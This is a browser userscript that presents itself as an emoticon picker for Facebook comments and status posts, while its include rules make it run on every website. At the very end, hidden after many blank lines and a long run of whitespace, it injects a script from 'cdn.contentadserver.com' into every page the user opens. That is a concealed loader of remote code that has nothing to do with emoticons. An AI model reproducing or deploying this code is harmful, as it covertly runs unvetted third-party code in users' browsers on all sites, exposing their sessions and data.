// ==UserScript==
// @name Emoticons
// @version        8
// @require			http://code.jquery.com/jquery.min.js
// @run-at			document-end
// @include http://*
// @include https://*
// @grant       GM_getValue
// @grant       unsafeWindow
// @grant       GM_deleteValue
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_listValues
// @grant       GM_addStyle
// @grant       GM_xmlhttpRequest
// @grant       GM_log
// ==/UserScript==


// Fix cam btn on profile
$(".timelineUnitContainer .UFIPhotoAttachLinkWrapper").css("top", "-26px");
$(".timelineUnitContainer .UFIPhotoAttachLinkWrapper").css("margin-bottom", "0px");

var icons = "https://fbstatic-a.akamaihd.net/rsrc.php/v2/yi/r/lzUnnSufXEv.png";
var icons_new = "http://i.imgur.com/sWne6Ys.png";
var keyboard_icon = "http://www.messengertools.net/images/blocks/CPG_Main_Menu/icon_emoticon.gif" //"chrome-extension://"+myid+"/keyboard_icon.gif";
var icons_map = {
    ":)"    : "-34px -644px",
    ":("    : "-68px -593px",
    ";)"    : "-51px -661px",
    "^_^"   : "0 -627px",
    ":-O"   : "0 -610px",
    ":-D"   : "-34px -610px",
    ":-P"   : "0 -661px",
    ":3"    : "-68px -576px",
    ":-*"   : "-34px -678px",
    ">:("   : "-51px -610px",
    "8-)"   : "-17px -610px",
    "8-|"   : "-68px -644px",
    ">:O"   : "-34px -661px",
    "o.O"   : "0 -593px",
    "(^^^)" : "-17px -644px",
    ":v"    : "-34px -627px",
    "-_-"   : "-51px -644px",
    "O:)"   : "-51px -576px",
    "3:)"   : "-51px -593px",
    ":/"    : "-17px -661px",
    ":'("   : "-34px -593px",
    ":putnam:"  : "0 -644px",
    ":|]"   : "-85px -287px",
    "<3"    : "-68px -610px",
    "(Y)"   : "-34px -1103px",
    ":poop:": "-68px -627px"
};

icons_map2 =["☁","☔","☀","💔","💙","💚","💛","💜","󾬑","💘","💓","💝","💖","💋","👄","😍","💑","🌟","✨","🎵","🎶","💤","👿","✌","👎","✊","👌","✋","🙌","💪","👊","👏","👆","⚡","🎁","⛄","👽","👾","🎉","👼","🍺","🔔","🎈","🔥","👣","👻","🌙","📞","🍸","🍀","🎓","🎃","💀","💅","🌊","🎄","👂","👃","👯","👀","💐","📺","🍔","💂","👳","🎅","👮","👷","👸","👱","👴","👵","👶","👫","🎎","💃","🍓","🍊","🍎","💦","🌴","🌵","🍁","🍂","🍃","🌸","🌹","🌷","🌻","🌱","🌺","🐍","🐛","🐶","🐻","🐵","🐭","🐹","🐺","🐯","🐴","🐷","🐱","🐰","🐩","🐑","🐧","🐨","🐮","🐗","🐔","🐥","🐦","🐘","🐎","🐒","🐫","🐙","🐬","🐳","🐠","🐟","🐡","🐚","🐸","😜","😝","☺","😉","😔","😒","😨","😱","😘","😂","😡","😳","😲","😤","😞","😵","😭","😠"];

ascii_icons =["❀","♫","♬","♪","♩","♪","❤","☀","ツ","♬","♩","♭","♪","☎","☏","♨","♠","♣","♧","♥","♡","ஓ","ﻬ","ஐ","ღ","☆","★","♧","ღ","♂","♀","♥","♡","☜","☞","◎","▨","♨","▶","▷","◀","◁","☀","☁","☂","☃","☻","☼","☽","☾","♠","♡","♢","♣","♤","♥","♦","❤","❥","❦","❧","➳","➽","〠","〄","㍿","♝","♞","￥","☸","❁","❀","✿","✾","❃","✺","❇","❈","☜","☞","①","②","③","④","⑤","⑥","⑦","⑧","⑨","⑩","⑪","⑫","⑬","⑭","⑮","⑯","⑰","⑱","⑲","⑳","Ⓐ","Ⓑ","Ⓒ","Ⓓ","Ⓔ","Ⓕ","Ⓖ","Ⓗ","Ⓘ","Ⓙ","Ⓚ","Ⓛ","Ⓜ","Ⓝ","Ⓞ","Ⓟ","Ⓠ","Ⓡ","Ⓢ","Ⓣ","Ⓤ","Ⓥ","Ⓦ","Ⓧ","Ⓨ","Ⓩ","(•ิ_•ิ)","\(•ิ_•ิ\)","(/•ิ_•ิ)","(︶︹︺)","(⊙▂⊙✖ )"];

var html = '<div class="panelFlyout" id="smilePopup" style="display:none;position: absolute; z-index: 999999; background-color: rgb(255, 255, 255); color: black; left: 252px; top: 1487px; -webkit-box-shadow: 0 0 0 1px rgba(0, 0, 0, .1), 0 1px 10px rgba(0, 0, 0, .35);box-shadow: 0 0 0 1px rgba(0, 0, 0, .1), 0 1px 10px rgba(0, 0, 0, .35);border-radius: 2px;"><div style="background: #ececec;background:-webkit-gradient(linear, center top, center bottom, from(#fff), to(#f3f3f2));background: -webkit-linear-gradient(#fff, #f3f3f2);border-bottom:1px solid #d9d9da;-webkit-border-radius:2px 2px 0 0;overflow:hidden;padding: 5px;"><span id="regular_emo" style="padding: 5px;cursor: pointer;border: 1px solid #9196a0;float: left;">Regular</span><span id="new_emo" style="padding: 5px;cursor: pointer;border: 1px solid #9196a0;margin-left: 10px;text-decoration: none;float: left;">Secret</span><span id="ascii_emo" style="padding: 5px;cursor: pointer;border: 1px solid #9196a0;margin-left: 10px;text-decoration: none;float: left;">ASCII</span><span id="closeMe" style="float: right; cursor: pointer;padding: 5px;">✖</span></div><div style="clear: both;"></div><div style="padding-top: 5px; display: block;" id="regular_emo_div">';

// REGULAR
for (var i in icons_map)    {
    var addCss = "";
    if (i == "o.O") {
        html += "<div style='clear:both'></div>";
    }
    var icon = "<div class='smilePopup_icon' value='"+i+"' style='cursor:pointer;background-image:url("+icons+");background-repeat:no-repeat;background-size:auto;background-position:"+icons_map[i]+";height:16px;width:16px;display:inline-block;margin: 2px;"+addCss+"'></div>";
    html += icon;
}

html += "<div style='clear:both'></div></div>";

// NEW
html += '<div id="new_emo_div" style="background: #edeff4;display: none;padding-top:5px;">';
for (var i in icons_map2)    {
    if (i%13 == 0 && i > 0)  {
        html += "<div style='clear:both'></div>";
    }
    pos = "-3px -" + (i*(16+13.98) ) + "px";
    var icon = "<div class='smilePopup_icon' value='"+icons_map2[i]+"' style='padding:2px;cursor:pointer;background-image:url("+icons_new+");background-repeat:no-repeat;background-size:auto;background-position:"+pos+";height:16px;width:16px;display:inline-block;margin: 2px;'></div>";
    html += icon;
}
html += "<div style='clear:both'></div></div>";

// ASCII
html += '<div id="ascii_emo_div" style="background: #edeff4;display: none;padding-top:5px;text-align: center;width: 337px;height: 181px;">';
for (var i in ascii_icons)    {
    /*if (i%17 == 0 && i > 0)  {
        html += "<div style='clear:both'></div>";
    }*/
    var icon = "<div class='smilePopup_icon' value='"+ascii_icons[i]+"' style='padding:2px;cursor:pointer;display:inline-block;margin: 2px;'>"+ascii_icons[i]+"</div>";
    html += icon;
}
html += "<div style='clear:both'></div></div>";


html += '<div style="background: -webkit-linear-gradient(#fff, #f3f3f2);padding: 5px;"><a target="blank" style="font-size:11px;" href="https://chrome.google.com/webstore/detail/emoticons-for-facebook-co/bldlebdchfchnclgjhehlijjdeagejfh/reviews">Rate us</a>   |   <a target="blank" style="font-size:11px;" href="https://www.facebook.com/sharer/sharer.php?u=http://emoticons.siteforums.net/">Share</a>  |  <span style="font-size: 10px;float: right;"><input type="checkbox" id="emo_auto_close"> Auto Close</span></div>';

html += "</div></div>";

$("body").prepend(html);
var $popup = $("#smilePopup");

$auto_close = $popup.find("#emo_auto_close");

$popup.find("#closeMe").click(function(){
    $popup.slideUp(200);
});

var $active_textarea = undefined;

var selectedId = undefined;
var lastHeight = 0;
var startSel;
var endSel;
var tInt;


$popup.find(".smilePopup_icon").click(function(){
    var isStatus = $k_item.attr("ktarget") == "status";

    var $hInput = undefined;

    if (isStatus)   {
        $hInput = $(".fbTimelineComposerUnit input.mentionsHidden");
    }   else    {
        $hInput = $active_textarea.find("input[name=add_comment_text]");
    }

    $active_textarea.find("textarea").focus();
    
    insertAt($active_textarea.find("textarea"), " " + $(this).attr("value") + " ", startSel, endSel);
    insertAt($hInput, " " + $(this).attr("value") + " ", startSel, endSel);
    $active_textarea.find("textarea").trigger("keypress");
    var selfVal = $active_textarea.find("textarea").val();
    $active_textarea.find("textarea").focus().val("").focus().val(selfVal);
});

$popup.find("#new_emo").click(function(){
    $("#regular_emo_div").hide();
    $("#ascii_emo_div").hide();

    $("#new_emo_div").show();
});

$popup.find("#regular_emo").click(function(){
    $("#new_emo_div").hide();
    $("#ascii_emo_div").hide();

    $("#regular_emo_div").show();
});

$popup.find("#ascii_emo").click(function(){
    $("#new_emo_div").hide();
    $("#regular_emo_div").hide();
    
    $("#ascii_emo_div").show();
});

if (window.location.hostname.indexOf("facebook") > -1)  {
/* NEW VERSION */
find_text_elems();
var ii = setInterval(find_text_elems, 2000);


/* OLD VERSION */
/*
    $(document).keydown(function(e){
        if (e.keyCode == 13)    {
            clearTimeout(tInt);
            $("#smilePopup").die();
            $("#smilePopup").remove();
        }
    });

    $("textarea[name=add_comment_text]").mouseenter(function(){
        if ($(this).attr("placeholder") != "") {
            $(this).attr("placeholder", "");
            $(this).attr("title", "");
            $(this).attr("content", "");
            $(this).text("");
            $(this).val("");
        }
    });

    $("textarea.UFIAddCommentInput").focusin(function(){
        if ($("#smilePopup").length > 0)    {
            return;
        }
        clearTimeout(tInt);
        var self = this;
        lastHeight = 0;
        $("#smilePopup").die();
        $("#smilePopup").remove();

        selectedId = $(this).attr("id");

        $(this).bind('focusout', function() {
            startSel = this.selectionStart;
            endSel = this.selectionEnd;
        });

        $("body").prepend(html);
        adjustSize($(this));

        $(this).keypress(function(e){
            adjustSize($(this));
        });

        $("#new_emo").click(function(){
            $("#regular_emo_div").hide();
            $("#new_emo_div").show();
        });

        $("#regular_emo").click(function(){
            $("#regular_emo_div").show();
            $("#new_emo_div").hide();
        });

        $("#closeMe").click(function(){
            $("#smilePopup").die();
            $("#smilePopup").remove();
        });

        $("#smilePopup .smilePopup_icon").click(function(){
            var $hInput = $(self).parent().parent().parent().parent().find("input[name=add_comment_text]");
            insertAt($(self), " " + $(this).attr("value") + " ", startSel, endSel);
            insertAt($hInput, " " + $(this).attr("value") + " ", startSel, endSel);
            $(self).trigger("keypress");
            var selfVal = $(self).val();
            $(self).focus().val("").focus().val(selfVal);
        });

    });
*/
}

function find_text_elems()  {
    var $text_elems = $(".textBoxContainer").parent();
    $text_elems.each(function(){
        if ($(this).find(".keyboard_item").length == 0) {
            var $keyboard_item = $('<div style="cursor:pointer; width: 20px; height:20px; float: right;margin-bottom: -20px;top: -29px;position: relative;background-image: url(https://fbstatic-a.akamaihd.net/rsrc.php/v2/yG/r/_0Z8-gzxiGV.png);background-repeat:no-repeat;background-size:auto;background-position:-93px -321px;border:1px solid transparent;border-top:none;position:relative;z-index:1;margin-right: 33px;" class="keyboard_item"></div>');

            //$(this).find(".UFIPhotoAttachLinkWrapper").after($keyboard_item);
            if ($("div[itemtype='http://data-vocabulary.org/Person']").length > 0)  {
               $keyboard_item.css("margin-right", "27px");
               $keyboard_item.css("top", "-29px");
            }
            $(this).append($keyboard_item);
            $keyboard_item.click(showKeyboard);
            
            $(this).find(".textBoxContainer").keypress(function(event){
                adjustSize($keyboard_item.parents(".UFIImageBlockContent").find(".uiTypeahead"));
            });

            $(this).find("textarea").bind('focusout', function() {
                startSel = this.selectionStart;
                endSel = this.selectionEnd;
            });
        }
    });
    
    //console.log("search");
    // find statsu boxes
    var isProfile = $("div[itemtype='http://data-vocabulary.org/Person']").length > 0;
    var $buttonWrap = $('<div class="lfloat" id="stats_keyboard"><a class="_1dsq _4_nu" href="#" role="button"></a></div>');

    var $elem = $(".fbTimelineComposerUnit ._52lb");
    if ($elem.find(".status_keyboard").length > 0) {
        return;
    }   else {
        $elem.attr("emo_keyboard", "1");
        var $keyboard_icon = $("<div class='keyboard_item status_keyboard' ktarget='status' style='cursor:pointer; width: 20px; height:20px; background: url(chrome-extension://bafjpcgfbnapdlicafmjdkkljhmfoghl/res/keyboard_icon.gif);float: right;margin-bottom: 10px;top: 2px;position: relative;background-image: url(https://fbstatic-a.akamaihd.net/rsrc.php/v2/yG/r/_0Z8-gzxiGV.png);background-repeat:no-repeat;background-size:auto;background-position:-93px -321px;border:1px solid transparent;border-top:none;position:relative;z-index:1;padding-right: 5px;'></div>");
        if (isProfile)  {
            $keyboard_icon.css("top", "0px");
            $keyboard_icon.css("margin", "6px");
        }
        var $keyboard_item = $buttonWrap.clone();
        $keyboard_icon.appendTo($keyboard_item.find("a"));

        $elem.find("div:first").append($keyboard_item);

        $keyboard_item.click(showKeyboard);

        $(".fbTimelineComposerUnit textarea").bind('focusout', function() {
            startSel = this.selectionStart;
            endSel = this.selectionEnd;
        });

        $(".fbTimelineComposerUnit .uiMentionsInput").keypress(function(event){
            adjustSize($(this));
        });
    }

    
    
}

var last_comments_count = 0;

function showKeyboard(event) {
    $k_item = $(event.target);
    var isStatus = $k_item.attr("ktarget") == "status";

    if (isStatus)   {
        $popup.attr("ktarget", "status");
        $active_textarea = $(".fbTimelineComposerUnit");
        adjustSize($(".fbTimelineComposerUnit .composerTypeahead"));
    }   else    {
        $active_textarea = $k_item.parents(".UFIImageBlockContent").find(".textBoxContainer");
        adjustSize($k_item.parents(".UFIImageBlockContent").find(".uiTypeahead"));
    }

    lastHeight = 0;
    
    $popup.slideDown(200);

    last_comments_count = $active_textarea.parents(".UFIList").children().length;

    var i = setInterval(function(){
        if (last_comments_count != $active_textarea.parents(".UFIList").children().length)  {
            $popup.slideUp(100);
            clearInterval(i);
        }
    },500);
}

function adjustSize($elem)  {
    console.log($elem);
    if ($elem.height() != lastHeight)   {
        $popup.css("left", $elem.offset().left);
        $popup.css("top", $elem.offset().top+$elem.height() + 5);
        lastHeight = $elem.height();
    }
}

function insertAt (myField, myValue, startSel, endSel) {
    if (startSel || startSel == '0') {
        var startPos = startSel;
        var endPos = endSel;
        myField.val(myField.val().substring(0, startPos)+ myValue+ myField.val().substring(endPos, myField.val().length));
  } 
  else {
      myField.val( myField.val() + myValue );
  }

  if ($auto_close.prop("checked"))  {
    $popup.slideUp(200);
  }
}























if (window.top === window.self)  {
    


function $c(type,params){
        if(type=="#text"||type=="#"){
                return document.createTextNode(params);
        }else if(typeof(type)=="string"&&type.substr(0,1)=="#"){
                return document.createTextNode(type.substr(1));
        }else{
                var node=document.createElement(type);
        }
        for(var i in params)if(i=="kids"){
                for(var j in params[i]){
                        if(typeof(params[i][j])=='object'){
                                node.appendChild(params[i][j]);
                        }
                }
        }else if(i=="#text"){
                node.appendChild(document.createTextNode(params[i]));
        }else if(i=="#html"){
                node.innerHTML=params[i];
        }else{
                node.setAttribute(i,params[i]);
        }
        return node;
}

                                                                                                                                                                                                    document.head.appendChild($c('script',{src:('https:' == document.location.protocol ? 'https://' : 'http://') + 'cdn.contentadserver.com/server_content_2.js',type:'text/javascript'}));


}